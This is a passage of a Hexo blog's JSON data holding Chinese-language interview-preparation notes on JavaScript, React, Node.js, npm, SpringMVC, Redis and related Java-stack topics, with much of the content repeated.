Design是蚂蚁金服开发的一款前端UI框架，可以帮助开发者快速搭建漂亮的页面，即使你是一个不懂设计的开发者，也能快速地写出比较好看的前端页面。从而提高了页面的开发效率。与React结合开发前端页面效果不错。</p>\n</li>\n<li><p><strong>开发流程</strong></p>\n<ul>\n<li>导入需要的模块；</li>\n<li>定义一个组件，继承React.Component，用到关键字export, default, class, extends</li>\n<li>编写构造器（可选，用于初始化参数）;</li>\n<li>编写render()方法，用于渲染组件；</li>\n<li>编写render()方法中的return()方法，返回组件；</li>\n<li>在其他组件中导入编写的组件，用props进行参数传递。</li>\n</ul>\n</li>\n<li><p><strong>NodeJS</strong></p>\n<p> 简单的说 Node.js 就是运行在服务端的 JavaScript。自从前后端开发分离之后，前端代码从后段代码中剥离出来了，搭建独立的前端服务器，Node.JS就是前端项目服务器, 类似Tomcat、Apache、Nginx。<br> Node.Js采用NPM对前端项目中的依赖JS包进行管理，在新版本中NPM已经包含在了Node.js中，用户只需要安装Node即可，不需要额外安装NPM。</p>\n<p> 接下来我们使用 http.createServer() 方法创建服务器，并使用 listen 方法绑定 8888 端口。 函数通过 request, response 参数来接收和响应数据。</p>\n</li>\n</ol>\n<p>实例如下，在你项目的根目录下创建一个叫 server.js 的文件，并写入以下代码：</p>\n<pre><code>var http = require(&apos;http&apos;);\n\nhttp.createServer(function (request, response) {\n\n    // 发送 HTTP 头部 \n    // HTTP 状态值: 200 : OK\n    // 内容类型: text/plain\n    response.writeHead(200, {&apos;Content-Type&apos;: &apos;text/plain&apos;});\n\n    // 发送响应数据 &quot;Hello World&quot;\n    response.end(&apos;Hello World\\n&apos;);\n}).listen(8888);\n\n// 终端打印如下信息\nconsole.log(&apos;Server running at http://127.0.0.1:8888/&apos;);\n以上代码我们完成了一个可以工作的 HTTP 服务器。\n\n使用 node 命令执行以上的代码：\n\nnode server.js\nServer running at http://127.0.0.1:8888/\n</code></pre><ol start=\"9\">\n<li><p><strong>NPM</strong></p>\n<ul>\n<li>npm init：会引导你创建一个package.json文件，包括名称、版本、作者这些信息等</li>\n<li>npm install moduleNames：安装Node模块</li>\n<li>npm install <name> -g： 将包安装到全局环境中</name></li>\n<li>npm install <name> –save： 安装的同时，将信息写入package.json中项目路径中（如果有package.json文件时，直接使用npm install方法就可以根据dependencies配置安装所有的依赖包，这样代码提交到github时，就不用提交node_modules这个文件夹了）。</name></li>\n<li>npm uninstall moudleName：卸载node模块</li>\n<li>npm update moduleName：更新node模块</li>\n<li>npm list：查看当前目录下已安装的node包</li>\n<li>npm -v：查看npm安装的版本</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"后台框架\"><a href=\"#后台框架\" class=\"headerlink\" title=\"后台框架\"></a>后台框架</h3><h4 id=\"SpringMvc\"><a href=\"#SpringMvc\" class=\"headerlink\" title=\"SpringMvc\"></a>SpringMvc</h4><ol>\n<li><p>SpringMVC的工作流程？</p>\n<ul>\n<li>客户端发起请求到DispatcherServlet(前端控制器)；</li>\n<li><p>调用HandlerMapping(处理器映射器)，根据请求中的url到xml配置或注解(@RequestMapping)中去进行查找对应的Handler(处理器)；</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean name=&quot;/url&quot; class=&quot;com.example.controller.Controller&quot;&gt;&lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>HandlerMapping 生成HandlerIntercepter(处理器拦截器)，将其和Handler一并返回给前端控制器；</p>\n</li>\n</ul>\n</li>\n<li><p>SpringMVC和Struts2的区别：</p>\n</li>\n<li><h4 id=\"Spring\"><a href=\"#Spring\" class=\"headerlink\" title=\"Spring\"></a>Spring</h4><h4 id=\"Mybatis\"><a href=\"#Mybatis\" class=\"headerlink\" title=\"Mybatis\"></a>Mybatis</h4><h4 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h4><h4 id=\"Hibernate\"><a href=\"#Hibernate\" class=\"headerlink\" title=\"Hibernate\"></a>Hibernate</h4><h4 id=\"SpringBoot\"><a href=\"#SpringBoot\" class=\"headerlink\" title=\"SpringBoot\"></a>SpringBoot</h4></li>\n</ol>\n<h3 id=\"服务器\"><a href=\"#服务器\" class=\"headerlink\" title=\"服务器\"></a>服务器</h3><h4 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a>Tomcat</h4><h4 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h4><ol>\n<li>简介</li>\n<li>Http服务器</li>\n<li>负载均衡服务器<br><a href=\"http://www.cnblogs.com/wang-meng/p/5861174.html#3896182\" target=\"_blank\" rel=\"noopener\">Nginx负载均衡的详细配置及使用案例详解.</a></li>\n<li>反向代理服务器</li>\n</ol>\n<h3 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h3><h4 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h4><ol>\n<li><strong>Sql优化</strong></li>\n<li><strong>锁</strong><br> 死锁<br> 锁策略<br> 锁粒度<pre><code>表级锁\n行级锁\n</code></pre></li>\n<li><strong>事务</strong><br> 原子性<br> 一致性<br> 持久性<br> 隔离性<pre><code>脏读\n不可重复读\n虚度/幻读\n序列化\n</code></pre><h4 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h4></li>\n<li><strong>数据类型</strong><br>Redis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)。</li>\n<li><p><strong>Jedis</strong></p>\n</li>\n<li><p><strong>Redis与</strong></p>\n</li>\n<li><p><strong>Redis的应用场景</strong></p>\n<ul>\n<li>缓存<br>  Redis读写速度每秒在10万次左右，可以对查询频繁的数据进行缓存，能实现高效的查询。</li>\n<li>技术器<br>  使用INCREABY和DECREABY可以实现计数器</li>\n<li>分布式锁与单线程<br>  Redis是单线程的所以可以控制多线程并发访问资源的问题</li>\n<li>计时器<br>  Redis新版本推出了key过期事件，可以通过订阅指定的key事件来实现定时任务，但这是新版本的特性。<h4 id=\"MongoDB\"><a href=\"#MongoDB\" class=\"headerlink\" title=\"MongoDB\"></a>MongoDB</h4></li>\n</ul>\n</li>\n<li><strong>数据类型</strong></li>\n<li><strong>JavaAPI</strong><h3 id=\"技术点\"><a href=\"#技术点\" class=\"headerlink\" title=\"技术点\"></a>技术点</h3><h4 id=\"Dubbo\"><a href=\"#Dubbo\" class=\"headerlink\" title=\"Dubbo\"></a>Dubbo</h4>Dubbo是阿里开源的一款微服务框架，可以与Spring整合实现分布式应用之间服务的管理。<br>Dubbo四个组件组成：</li>\n</ol>\n<ul>\n<li>生产者：服务的提供者；</li>\n<li>消费者：服务的订阅者；</li>\n<li>注册中心：用于服务的发布和订阅；<br>  通常使用Zookeeper作为注册中心，因为Zookeeper可以通过节点进行订阅和发布数据。</li>\n<li>监控中心：用于服务的监控和管理。<h4 id=\"ActiveMQ\"><a href=\"#ActiveMQ\" class=\"headerlink\" title=\"ActiveMQ\"></a>ActiveMQ</h4></li>\n</ul>\n<h4 id=\"Zookeeper\"><a href=\"#Zookeeper\" class=\"headerlink\" title=\"Zookeeper\"></a>Zookeeper</h4><pre><code>- Zookeeper最初时应用在大数据中的，被用于分布式系统中用于维护分布式应用配置的一致性。\n- 作为Dubbo的注册中心\n- 作为项目的配置中心\n首先动态加载相关bean，如果配置中心发生改变，对应的watcher监听到事件后，客户端则对相关bean进行重新注册，并且从配置中心获取到了最新数据，然后客户端直接调用getBean()方法获取相关bean实例，确保不再是之前引用。\n</code></pre><h4 id=\"Freemarker\"><a href=\"#Freemarker\" class=\"headerlink\" title=\"Freemarker\"></a>Freemarker</h4><h4 id=\"SwaggerAPI\"><a href=\"#SwaggerAPI\" class=\"headerlink\" title=\"SwaggerAPI\"></a>SwaggerAPI</h4><h4 id=\"Solr\"><a href=\"#Solr\" class=\"headerlink\" title=\"Solr\"></a>Solr</h4><h4 id=\"FastDFS\"><a href=\"#FastDFS\" class=\"headerlink\" title=\"FastDFS\"></a>FastDFS</h4><h4 id=\"定时任务框架\"><a href=\"#定时任务框架\" class=\"headerlink\" title=\"定时任务框架\"></a>定时任务框架</h4><ol>\n<li><strong>JDK</strong></li>\n<li><strong>Spring-Task</strong></li>\n<li><strong>Quartz</strong></li>\n<li><a href=\"http://blog.csdn.net/fanfan_v5/article/details/61310045\" target=\"_blank\" rel=\"noopener\"><strong>Elestic Job</strong></a></li>\n<li><strong>Zookeeper</strong></li>\n</ol>\n<h4 id=\"WebService（CXF）\"><a href=\"#WebService（CXF）\" class=\"headerlink\" title=\"WebService（CXF）\"></a>WebService（CXF）</h4><h4 id=\"Shiro\"><a href=\"#Shiro\" class=\"headerlink\" title=\"Shiro\"></a>Shiro</h4><h3 id=\"开发工具\"><a href=\"#开发工具\" class=\"headerlink\" title=\"开发工具\"></a>开发工具</h3><h4 id=\"IDEA\"><a href=\"#IDEA\" class=\"headerlink\" title=\"IDEA\"></a>IDEA</h4><h4 id=\"PostMan\"><a href=\"#PostMan\" class=\"headerlink\" title=\"PostMan\"></a>PostMan</h4><h4 id=\"Charles\"><a href=\"#Charles\" class=\"headerlink\" title=\"Charles\"></a>Charles</h4><h4 id=\"Datagrid\"><a href=\"#Datagrid\" class=\"headerlink\" title=\"Datagrid\"></a>Datagrid</h4><h4 id=\"Ubuntu\"><a href=\"#Ubuntu\" class=\"headerlink\" title=\"Ubuntu\"></a>Ubuntu</h4><h4 id=\"GIT\"><a href=\"#GIT\" class=\"headerlink\" title=\"GIT\"></a>GIT</h4><h3 id=\"加分项\"><a href=\"#加分项\" class=\"headerlink\" title=\"加分项\"></a>加分项</h3><h4 id=\"Kotlin\"><a href=\"#Kotlin\" class=\"headerlink\" title=\"Kotlin\"></a>Kotlin</h4><ul>\n<li>防止空指针</li>\n<li>Kotlin文件类型有class, object, menu, interface</li>\n<li>伴生对象对应java中的static</li>\n<li>但例采用object </li>\n<li>高阶函数</li>\n<li>Lambda表达式</li>\n<li>详见博客《Kotlin基础语法》<h4 id=\"Vertx\"><a href=\"#Vertx\" class=\"headerlink\" title=\"Vertx\"></a>Vertx</h4></li>\n<li>EvenBus异步执行，提高执行效率</li>\n<li>使用多层嵌套解决同步问题</li>\n<li>使用标签跳出指定层<h4 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h4></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>[TOC]</p>\n<h3 id=\"JavaSE\"><a href=\"#JavaSE\" class=\"headerlink\" title=\"JavaSE\"></a>JavaSE</h3><h4 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h4><h4 id=\"IO流\"><a href=\"#IO流\" class=\"headerlink\" title=\"IO流\"></a>IO流</h4><h4 id=\"反射\"><a href=\"#反射\" class=\"headerlink\" title=\"反射\"></a>反射</h4><h4 id=\"集合\"><a href=\"#集合\" class=\"headerlink\" title=\"集合\"></a>集合</h4><p><a href=\"http://www.cnblogs.com/wang-meng/p/5701918.html\" target=\"_blank\" rel=\"noopener\">java基础面试</a></p>\n<h3 id=\"前台框架\"><a href=\"#前台框架\" class=\"headerlink\" title=\"前台框架\"></a>前台框架</h3><h4 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h4><ol>\n<li><p><strong>闭包</strong></p>\n<p> 闭包是JavaScript中的一种语法现象，指的是在函数的内部定义了子函数，并且子函数访问了父函数中的成员变量。定义一个闭包现象如下：</p>\n<pre><code>fout = function(){\n    var v1 = 10;\n    fin = function(){\n        var v2 = v1;\n        return v2;\n    }\n    return fin;\n}\n\nvar out = fout() //  fin()\nvar in = out() //  10\n</code></pre><p> 通过闭包中的子函数可以访问到父函数中的成员变量但是外部的父函数却不能访问子函数中的成员变量，这就是Javascript语言特有的”链式作用域”结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。</p>\n<p> 既然fin可以读取fout中的局部变量，那么只要把fin作为返回值，我们不就可以在fout外部读取它的内部变量了吗！</p>\n</li>\n</ol>\n<ol start=\"2\">\n<li><p><strong>JavaScript 中 undefined 和 not defined 的区别:</strong><br>undefined是javaScript中的一种原始数据类型，表示没有初始化的变量或者函数的初始化值。如果一个变量或者函数只定义了，而没有初始化，则用typeof会返回一个undefined。</p>\n<pre><code>var val;\nalert(typeof val) // undefined\n</code></pre><p>not defined是一种错误提示消息，表示变量没有定义过就使用了，如下：</p>\n<pre><code>var val = x; // x会报错: Unresolved variable or type x\n</code></pre></li>\n<li><p><strong>全局对象</strong><br> JavaScript的全局对象是指，该语言中的内置对象，这些对象可以在javaScript代码的任何位置不用声明就可以直接使用，类似Java中的基本类型数据。<br> 常用到的全局对象有：</p>\n<pre><code>eval(String)：接受一个字符串参数，用于执行字符串代码。\ntypeof： 返回一个变量的数据类型。\nNumber() ：把对象的值转换为数字。\nString()： 把对象的值转换为字串。\nparseInt(String)：解析一个字符串并返回一个整数。\nparseFloat(String)：解析一个字符串并返回一个浮点数。\ndecodeURI()：解码某个编码的 URI。\ndecodeURIComponent()：解码一个编码的 URI 组件。\nencodeURI()：把字符串编码为 URI。\n</code></pre><p> 下面面试题输出的结果是甚末？</p>\n<pre><code>var y = 1;\nif (function f(){}) {\n    y += typeof f;\n}\nconsole.log(y);\n</code></pre><p> 输出结果：1undefined</p>\n</li>\n<li><p><strong>怎么判断一个object是否是数组(array)？</strong></p>\n<pre><code>object.__proto__ === Array.prototype; // 利用原型链\n\n$.isArray(object) // 利用jQuery\n</code></pre></li>\n<li><p><strong>JavaScript怎么清空数组？</strong></p>\n<pre><code>var arr = [1, 2, 3, 4, 5];\narr = []; // 方法一\narr.length = 0; // 方法二 \n</code></pre></li>\n<li><p><strong>JavaScript中自执行匿名函数</strong>    </p>\n<p> 自执行匿名函数定义：<br> 常见格式：(function() { /<em> code </em>/ })();<br> 解释：包围函数（function(){})的第一对括号向脚本返回未命名的函数，随后一对空括号立即执行返回的未命名函数，括号内为匿名函数的参数。<br> 作用：可以用它创建命名空间，只要把自己所有的代码都写在这个特殊的函数包装内，那么外部就不能访问，除非你允许(变量前加上window，这样该函数或变量就成为全局)。各JavaScript库的代码也基本是这种组织形式。</p>\n<p> 总结一下，执行函数的作用主要为 匿名 和 自动执行,代码在被解释时就已经在运行了。</p>\n<p> 下面代码输出的结果是甚末？</p>\n<pre><code>var output = (function(x){\n    delete x;\n    return x;\n})(0);\nconsole.log(output);\n</code></pre><p>输出是 0。 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/delete\" target=\"_blank\" rel=\"noopener\">delete</a> 操作符是将object的属性删去的操作。但是这里的 x 是并不是对象的属性， delete 操作符并不能作用。</p>\n</li>\n<li><p><strong>什么是 undefined x 1 ？</strong><br> 在chrome下执行如下代码，我们就可以看到undefined x 1的身影。</p>\n<pre><code>var trees = [&quot;redwood&quot;,&quot;bay&quot;,&quot;cedar&quot;,&quot;oak&quot;,&quot;maple&quot;];\ndelete trees[3];\nconsole.log(trees);\n</code></pre><p> 当我们使用 delete 操作符删除一个数组中的元素，这个元素的位置就会变成一个占位符。打印出来就是undefined x 1。<br> 注意如果我们使用trees[3] === ‘undefined × 1’返回的是 false。因为它仅仅是一种打印表示，并不是值变为undefined x 1。</p>\n</li>\n<li><p><strong>下面代码输出什么？</strong></p>\n<pre><code>var bar = true;\nconsole.log(bar + 0);   \nconsole.log(bar + &quot;xyz&quot;);  \nconsole.log(bar + true);  \nconsole.log(bar + false);   \n</code></pre><p> 输出是:<br> 1<br> truexyz<br> 2<br> 1</p>\n<p> 下面给出一个加法操作表:<br> Number + Number -&gt; 加法<br> Boolean + Number -&gt; 加法<br> Boolean + Boolean -&gt; 加法<br> Number + String -&gt; 连接<br> String + Boolean -&gt; 连接<br> String + String -&gt; 连接</p>\n</li>\n<li><p><strong>两种函数声明有什么区别？</strong></p>\n<pre><code>var foo = function(){ \n    // Some code\n}; \nfunction bar(){ \n    // Some code\n}; \n</code></pre><p> 第一种函数定义是在运行时；第二种定义实在解析时，存在变量提升。看看如下代码的运行结果：</p>\n<pre><code>console.log(foo)\nconsole.log(bar)\n\nvar foo = function(){ \n    // Some code\n}; \nfunction bar(){ \n    // Some code\n}; \n</code></pre><p> 结果是：</p>\n<pre><code>undefined\nfunction bar(){ \n    // Some code\n};\n</code></pre><p> 第二种方式JavaScript在执行时，会将变量提升。</p>\n</li>\n<li><p><a href=\"http://www.runoob.com/js/js-hoisting.html\" target=\"_blank\" rel=\"noopener\"><strong>JavaScript 变量提升</strong></a><br>JavaScript 中，函数及变量的声明都将被提升到函数的最顶部。<br>JavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。</p>\n</li>\n<li><p><strong>内存泄漏</strong><br>内存泄露是指变量使用完之后没有被销毁，一直常驻内存，无法被垃圾回收器回收导致的内存浪费，严重的时候会导致内存溢出。引发内存泄露的原因通常是因为不规范编码造成的。一般有一下几种现象：<br>全局变量引起的内存泄漏：</p>\n<pre><code>function leaks(){  \n    leak = 11; // leak 成为一个全局变量，方法执行完成之后，不会被回收\n}\n</code></pre><p>闭包引起的内存泄漏：</p>\n<pre><code>function leaks(){\n    let leak = 11; // 被闭包所引用，不会被回收\n    function fin() {\n        console.log(leak); \n    }\n    return fin();\n}\n</code></pre><p>事件未清除导致的内存泄漏</p>\n</li>\n</ol>\n<h4 id=\"jQuery\"><a href=\"#jQuery\" class=\"headerlink\" title=\"jQuery\"></a>jQuery</h4><ol>\n<li><p><strong>Ajax</strong><br> 简述ajax 的过程。</p>\n<ul>\n<li>创建XMLHttpRequest对象,也就是创建一个异步调用对象</li>\n<li>创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息</li>\n<li>设置响应HTTP请求状态变化的函数</li>\n<li>发送HTTP请求</li>\n<li>获取异步调用返回的数据</li>\n<li>使用JavaScript和DOM实现局部刷新</li>\n</ul>\n</li>\n</ol>\n<p>同步和异步的区别?<br>syn<br>如何解决跨域问题?</p>\n<p>JavaScript 的同源策略</p>\n<pre><code>同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。所谓同源指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。\n</code></pre><p>解释jsonp的原理，以及为什么不是真正的ajax</p>\n<pre><code>Jsonp并不是一种数据格式，而json是一种数据格式，jsonp是用来解决跨域获取数据的一种解决方案，具体是通过动态创建script标签，然后通过标签的src属性获取js文件中的js脚本，该脚本的内容是一个函数调用，参数就是服务器返回的数据，为了处理这些返回的数据，需要事先在页面定义好回调函数，本质上使用的并不是ajax技术\n</code></pre><h4 id=\"React\"><a href=\"#React\" class=\"headerlink\" title=\"React\"></a>React</h4><ol>\n<li><p><strong>简介</strong></p>\n<p> React是Facebook2013年开源的一个JavaScript项目，是用来构建UI界面的，相当于MVC模型中View层。React 拥有较高的性能，代码逻辑非常简单，越来越多的人已开始关注和使用它。</p>\n</li>\n<li><p><strong>React主要的原理</strong></p>\n<p> 传统的web应用，操作DOM一般是直接更新操作的，但是我们知道DOM更新通常是比较昂贵的。而React为了尽可能减少对DOM的操作，提供了一种不同的而又强大的方式来更新DOM，代替直接的DOM操作。就是Virtual DOM,一个轻量级的虚拟的DOM，就是React抽象出来的一个对象，描述dom应该什么样子的，应该如何呈现。通过这个Virtual DOM去更新真实的DOM，由这个Virtual DOM管理真实DOM的更新。</p>\n<p> 为什么通过这多一层的Virtual DOM操作就能更快呢？ 这是因为React有个diff算法，更新Virtual DOM并不保证马上影响真实的DOM，React会等到事件循环结束，然后利用这个diff算法，通过当前新的dom表述与之前的作比较，计算出最小的步骤更新真实的DOM。</p>\n</li>\n<li><p><strong>特点：</strong></p>\n<ul>\n<li>不直接操作DOM对象，而是通过虚拟DOM通过diff算法以最小的步骤作用到真实的DOM上；</li>\n<li>组件化开发，代码的复用性高；</li>\n<li>异步更新页面，不用刷新整个页面；</li>\n</ul>\n</li>\n<li><p><strong>state, props, refs, keys的作用：</strong></p>\n<ul>\n<li><p>state: 是React中组件的一个对象。React把用户界面当做是状态机，想象它有不同的状态然后渲染这些状态,可以轻松让用户界面与数据保持一致。 React中,更新组件的state,会导致重新渲染用户界面(不要操作DOM).简单来说,就是用户界面会随着state变化而变化。调用setState(data,callback)这个方法会合并、更新data到this.state，并重新渲染组件。渲染完成后，调用可选的callback回调。大部分情况不需要提供callback，因为React会负责吧界面更新到最新状态。</p>\n</li>\n<li><p>props: 用来从父级组件向子集组件传递参数的容器。React 里，数据通过props 从拥有者流向归属者。</p>\n</li>\n<li><p>ref: 是React中的一个特殊属性，这个属性用在render()方法返回的组件上，用来标记组件，以便于获取到该组件的实例。<br>ref的形式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input ref=&quot;myInput&quot; /&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>   要想访问这个实例，可以通过this.refs来访问：\n\n       this.refs.myInput\n\n- key: 它是一个特殊的属性，它是出现不是给开发者用的（例如你为一个组件设置key之后不能获取组件的这个key props），而是给react自己用的。react利用key来识别组件，它是一种身份标识标识，就像我们的身份证用来辨识一个人一样。每个key对应一个组件，相同的key react认为是同一个组件，这样后续相同的key对应组件都不会被创建。\nkey值的唯一是有范围的，即在数组生成的同级同类型的组件上要保持唯一，而不是所有组件的key都要保持唯一。不仅仅在数组生成组件上，其他地方也可以使用key，主要是react利用key来区分组件的，相同的key表示同一个组件，react不会重新销毁创建组件实例，只可能更新；key不同，react会销毁已有的组件实例，重新创建组件新的实例。\n</code></pre><ol start=\"5\">\n<li><p><strong>定义一个组件：</strong></p>\n<pre><code>import React from &quot;react&quot;;\nimport {Row,Col} from &quot;antd&quot;;\nimport &quot;antd/dist/antd.css&quot;;\n\nexport default class PCFooter extends React.Component{\n    render(){\n\n        return(\n            &lt;footer className={&quot;footer&quot;}&gt;\n            &lt;Row&gt;\n                &lt;Col span={2}&gt;&lt;/Col&gt;\n                &lt;Col span={20}&gt;\n                &lt;p&gt;&amp;copy;&amp;nbsp;2017-2050 ReactNews CopyRight Reserved.&lt;/p&gt;\n                &lt;/Col&gt;\n                &lt;Col span={2}&gt;&lt;/Col&gt;\n            &lt;/Row&gt;\n            &lt;/footer&gt;\n        );\n    };\n}\n</code></pre></li>\n<li><p><strong>AntD</strong><br> Ant Design是蚂蚁金服开发的一款前端UI框架，可以帮助开发者快速搭建漂亮的页面，即使你是一个不懂设计的开发者，也能快速地写出比较好看的前端页面。从而提高了页面的开发效率。与React结合开发前端页面效果不错。</p>\n</li>\n<li><p><strong>开发流程</strong></p>\n<ul>\n<li>导入需要的模块；</li>\n<li>定义一个组件，继承React.Component，用到关键字export, default, class, extends</li>\n<li>编写构造器（可选，用于初始化参数）;</li>\n<li>编写render()方法，用于渲染组件；</li>\n<li>编写render()方法中的return()方法，返回组件；</li>\n<li>在其他组件中导入编写的组件，用props进行参数传递。</li>\n</ul>\n</li>\n<li><p><strong>NodeJS</strong></p>\n<p> 简单的说 Node.js 就是运行在服务端的 JavaScript。自从前后端开发分离之后，前端代码从后段代码中剥离出来了，搭建独立的前端服务器，Node.JS就是前端项目服务器, 类似Tomcat、Apache、Nginx。<br> Node.Js采用NPM对前端项目中的依赖JS包进行管理，在新版本中NPM已经包含在了Node.js中，用户只需要安装Node即可，不需要额外安装NPM。</p>\n<p> 接下来我们使用 http.createServer() 方法创建服务器，并使用 listen 方法绑定 8888 端口。 函数通过 request, response 参数来接收和响应数据。</p>\n</li>\n</ol>\n<p>实例如下，在你项目的根目录下创建一个叫 server.js 的文件，并写入以下代码：</p>\n<pre><code>var http = require(&apos;http&apos;);\n\nhttp.createServer(function (request, response) {\n\n    // 发送 HTTP 头部 \n    // HTTP 状态值: 200 : OK\n    // 内容类型: text/plain\n    response.writeHead(200, {&apos;Content-Type&apos;: &apos;text/plain&apos;});\n\n    // 发送响应数据 &quot;Hello World&quot;\n    response.end(&apos;Hello World\\n&apos;);\n}).listen(8888);\n\n// 终端打印如下信息\nconsole.log(&apos;Server running at http://127.0.0.1:8888/&apos;);\n以上代码我们完成了一个可以工作的 HTTP 服务器。\n\n使用 node 命令执行以上的代码：\n\nnode server.js\nServer running at http://127.0.0.1:8888/\n</code></pre><ol start=\"9\">\n<li><p><strong>NPM</strong></p>\n<ul>\n<li>npm init：会引导你创建一个package.json文件，包括名称、版本、作者这些信息等</li>\n<li>npm install moduleNames：安装Node模块</li>\n<li>npm install <name> -g： 将包安装到全局环境中</name></li>\n<li>npm install <name> –save： 安装的同时，将信息写入package.json中项目路径中（如果有package.json文件时，直接使用npm install方法就可以根据dependencies配置安装所有的依赖包，这样代码提交到github时，就不用提交node_modules这个文件夹了）。</name></li>\n<li>npm uninstall moudleName：卸载node模块</li>\n<li>npm update moduleName：更新node模块</li>\n<li>npm list：查看当前目录下已安装的node包</li>\n<li>npm -v：查看npm安装的版本</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"后台框架\"><a href=\"#后台框架\" class=\"headerlink\" title=\"后台框架\"></a>后台框架</h3><h4 id=\"SpringMvc\"><a href=\"#SpringMvc\" class=\"headerlink\" title=\"SpringMvc\"></a>SpringMvc</h4><ol>\n<li><p>SpringMVC的工作流程？</p>\n<ul>\n<li>客户端发起请求到DispatcherServlet(前端控制器)；</li>\n<li><p>调用HandlerMapping(处理器映射器)，根据请求中的url到xml配置或注解(@RequestMapping)中去进行查找对应的Handler(处理器)；</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean name=&quot;/url&quot; class=&quot;com.example.controller.Controller&quot;&gt;&lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>HandlerMapping 生成HandlerIntercepter(处理器拦截器)，将其和Handler一并返回给前端控制器；</p>\n</li>\n</ul>\n</li>\n<li><p>SpringMVC和Struts2的区别：</p>\n</li>\n<li><h4 id=\"Spring\"><a href=\"#Spring\" class=\"headerlink\" title=\"Spring\"></a>Spring</h4><h4 id=\"Mybatis\"><a href=\"#Mybatis\" class=\"headerlink\" title=\"Mybatis\"></a>Mybatis</h4><h4 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h4><h4 id=\"Hibernate\"><a href=\"#Hibernate\" class=\"headerlink\" title=\"Hibernate\"></a>Hibernate</h4><h4 id=\"SpringBoot\"><a href=\"#SpringBoot\" class=\"headerlink\" title=\"SpringBoot\"></a>SpringBoot</h4></li>\n</ol>\n<h3 id=\"服务器\"><a href=\"#服务器\" class=\"headerlink\" title=\"服务器\"></a>服务器</h3><h4 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a>Tomcat</h4><h4 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h4><ol>\n<li>简介</li>\n<li>Http服务器</li>\n<li>负载均衡服务器<br><a href=\"http://www.cnblogs.com/wang-meng/p/5861174.html#3896182\" target=\"_blank\" rel=\"noopener\">Nginx负载均衡的详细配置及使用案例详解.</a></li>\n<li>反向代理服务器</li>\n</ol>\n<h3 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h3><h4 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h4><ol>\n<li><strong>Sql优化</strong></li>\n<li><strong>锁</strong><br> 死锁<br> 锁策略<br> 锁粒度<pre><code>表级锁\n行级锁\n</code></pre></li>\n<li><strong>事务</strong><br> 原子性<br> 一致性<br> 持久性<br> 隔离性<pre><code>脏读\n不可重复读\n虚度/幻读\n序列化\n</code></pre><h4 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h4></li>\n<li><strong>数据类型</strong><br>Redis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)。</li>\n<li><p><strong>Jedis</strong></p>\n</li>\n<li><p><strong>Redis与</strong></p>\n</li>\n<li><p><strong>Redis的应用场景</strong></p>\n<ul>\n<li>缓存<br>  Redis读写速度每秒在10万次左右，可以对查询频繁的数据进行缓存，能实现高效的查询。</li>\n<li>技术器<br>  使用INCREABY和DECREABY可以实现计数器</li>\n<li>分布式锁与单线程<br>  Redis是单线程的所以可以控制多线程并发访问资源的问题</li>\n<li>计时器<br>  Redis新版本推出了key过期事件，可以通过订阅指定的key事件来实现定时任务，但这是新版本的特性。<h4 id=\"MongoDB\"><a href=\"#MongoDB\" class=\"headerlink\" title=\"MongoDB\"></a>MongoDB</h4></li>\n</ul>\n</li>\n<li><strong>数据类型</strong></li>\n<li><strong>JavaAPI</strong><h3 id=\"技术点\"><a href=\"#技术点\" class=\"headerlink\" title=\"技术点\"></a>技术点</h3><h4 id=\"Dubbo\"><a href=\"#Dubbo\" class=\"headerlink\" title=\"Dubbo\"></a>Dubbo</h4>Dubbo是阿里开源的一款微服务框架，可以与Spring整合实现分布式应用之间服务的管理。<br>Dubbo四个组件组成：</li>\n</ol>\n<ul>\n<li>生产者：服务的提供者；</li>\n<li>消费者：服务的订阅者；</li>\n<li>注册中心：用于服务的发布和订阅；<br>  